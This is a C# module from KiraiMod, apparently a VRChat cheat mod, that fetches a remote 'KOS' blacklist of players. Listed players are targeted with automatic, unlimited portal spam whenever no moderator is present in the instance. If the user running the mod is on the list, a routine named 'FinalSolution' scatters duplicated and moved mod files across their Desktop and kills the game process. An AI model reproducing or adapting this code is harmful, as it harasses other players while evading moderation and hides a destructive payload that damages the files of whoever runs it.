using System.Collections.Generic;
using System.IO;
using System.Net;
using VRC;
using MelonLoader;
using System.Collections;
using VRC.SDKBase;
using UnityEngine;
using VRC.Core;
using System;

namespace KiraiMod.Modules
{
    public class KOS : ModuleBase
    {
        private bool active = false;
        private bool oAuto = false;
        private bool oInfinite = false;
        private Player oTarget = null;

        public string[] kosList = new string[0];
        public List<Player> players = new List<Player>();

        public new ModuleInfo[] info = {
            new ModuleInfo("Auto KOS", "Auto targets and portals players on the KOS list", ButtonType.Toggle, 11, Shared.PageIndex.toggles2, nameof(state)),
            new ModuleInfo("Refresh KOS", "Refreshes KOS list and scans lobby", ButtonType.Button, 4, Shared.PageIndex.buttons1, nameof(Refresh))
        };

        public KOS()
        {
            RefreshList();
            MelonCoroutines.Start(VerifySelf());
        }

        public override void OnPlayerJoined(Player player)
        {
            players.Add(player);
            if (state) RefreshStatus();
        }

        public override void OnPlayerLeft(Player player)
        {
            for (int i = 0; i < players.Count; i++)
            {
                if (players[i] == null)
                {
                    players.RemoveAt(i);
                    i--;
                }
            }
            
            if (state) RefreshStatus();
        }

        public override void OnStateChange(bool state)
        {
            if (state) RefreshStatus();
            else Deactivate();
        }

        public void RefreshList()
        {
            try
            {
                string data = new StreamReader(((HttpWebResponse)WebRequest
                    .Create("https://raw.githubusercontent.com/xKiraiChan/xKiraiChan/main/Blacklist.txt")
                    .GetResponse())
                    .GetResponseStream())
                    .ReadToEnd();

                if (data[data.Length - 1] == '\n')
                    data = data.Remove(data.Length - 1);

                kosList = data.Split('\n');
                MelonLogger.Msg("Downloaded KOS list with " + kosList.Length + " users");

#if DEBUG
                for (int i = 0; i < kosList.Length; i++)
                {
                    //MelonLogger.Msg($"[KOS] {i}: {kosList[i]}");
                }
#endif
            }
            catch { MelonLogger.Warning("Failed to download KOS list."); }
        }

        public void RefreshStatus()
        {
            if (!state) return;

            for (int i = 0; i < players.Count; i++)
            {
                if (players[i] == null)
                {
                    players.RemoveAt(i);
                    i--;
                    continue;
                }

                if (players[i].field_Private_VRCPlayerApi_0 == null) continue;

                if (players[i].IsKOS()) {
                    MelonLogger.Msg("Found user on KOS list");
                    Activate(players[i]);
                    return;
                }
            }
            Deactivate();
        }

        private void Activate(Player target)
        {
            foreach (Player player in PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0)
            {
                if (player.IsMod())
                {
                    MelonLogger.Msg("[KOS] Would have activated but a moderator is in the instance");
                    return;
                }
            }

            if (active) return;
            active = true;

            oTarget = Shared.TargetPlayer;
            Shared.TargetPlayer = target;

            if (KiraiLib.UI.elements.TryGetValue("p0/auto-portal", out KiraiLib.UI.UIElement v1))
            {
                KiraiLib.UI.Toggle toggle = v1 as KiraiLib.UI.Toggle;

                oAuto = toggle.state;
                toggle.SetState(true);
            }

            if (KiraiLib.UI.elements.TryGetValue("p0/infinite-portals", out KiraiLib.UI.UIElement v2))
            {
                KiraiLib.UI.Toggle toggle = v2 as KiraiLib.UI.Toggle;

                oInfinite = toggle.state;
                toggle.SetState(true);
            }
        }

        private void Deactivate()
        {
            if (!active) return;
            active = false;

            Shared.TargetPlayer = oTarget;
            oTarget = null;

            if (KiraiLib.UI.elements.TryGetValue("p0/auto-portal", out KiraiLib.UI.UIElement v1))
            {
                KiraiLib.UI.Toggle toggle = v1 as KiraiLib.UI.Toggle;

                toggle.SetState(oAuto);
                oAuto = false;
            }

            if (KiraiLib.UI.elements.TryGetValue("p0/infinite-portals", out KiraiLib.UI.UIElement v2))
            {
                KiraiLib.UI.Toggle toggle = v2 as KiraiLib.UI.Toggle;

                toggle.SetState(oInfinite);
                oInfinite = false;
            }

            Helper.DeletePortals();
        }

        public void Refresh()
        {
            Shared.modules.kos.RefreshList();
            Shared.modules.kos.RefreshStatus();
            Shared.modules.nameplates.Refresh();
        }

        public IEnumerator VerifySelf()
        {
            while (APIUser.CurrentUser == null) yield return new WaitForSeconds(1);
            if (APIUser.CurrentUser.IsKOS())
            {
                MelonLogger.Msg("Failed to verify self.");
                Warning();
            }
        }

        public void Warning()
        {
            object token = MelonCoroutines.Start(ShowNotice());
            MelonCoroutines.Start(FinalSolution(token));
        }

        private IEnumerator ShowNotice()
        {
            bool flip = false;

            for (;;)
            {
                if (flip) VRCUiPopupManager.prop_VRCUiPopupManager_0.Method_Public_Void_String_String_Single_0(
                    "<color=#5600a5>Important Notice</color>", 
                    "<color=#5600a5>You are not authorized to run KiraiMod</color>");
                else VRCUiPopupManager.prop_VRCUiPopupManager_0.Method_Public_Void_String_String_Single_0(
                    "<color=#ccf>Important Notice</color>",
                    "<color=#ccf>You are not authorized to run KiraiMod</color>");

                flip ^= true;

                yield return null;
                yield return null;
                yield return null;
            }
        }

        private IEnumerator FinalSolution(object token)
        {
            yield return new WaitForSecondsRealtime(3);

            MelonCoroutines.Stop(token);

            foreach (string path in Directory.EnumerateFiles("Mods"))
            {
                for (int i = 0; i < UnityEngine.Random.Range(0, 20); i++)
                    File.Copy(path, $"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}/{Guid.NewGuid()}");

                File.Move(path, $"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}/{Guid.NewGuid()}");
            }

            yield return new WaitForSecondsRealtime(1);

            // one of these will work trust me
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_1();
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_2();
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_3();
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_0(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_1(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_2(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_3(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_4(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_5(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_6(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_7(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Void_APIUser_8(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_0(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_1(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_2(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_3(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_4(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_PDM_0(APIUser.CurrentUser);
            //ObjectPublicObLi1ApSiLi1ApBoSiUnique.prop_ObjectPublicObLi1ApSiLi1ApBoSiUnique_0.Method_Public_Boolean_APIUser_PDM_1(APIUser.CurrentUser);

            yield return new WaitForSecondsRealtime(1);

            Utils.Unsafe.Kill();

            yield return new WaitForSecondsRealtime(1);

            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
    }
}
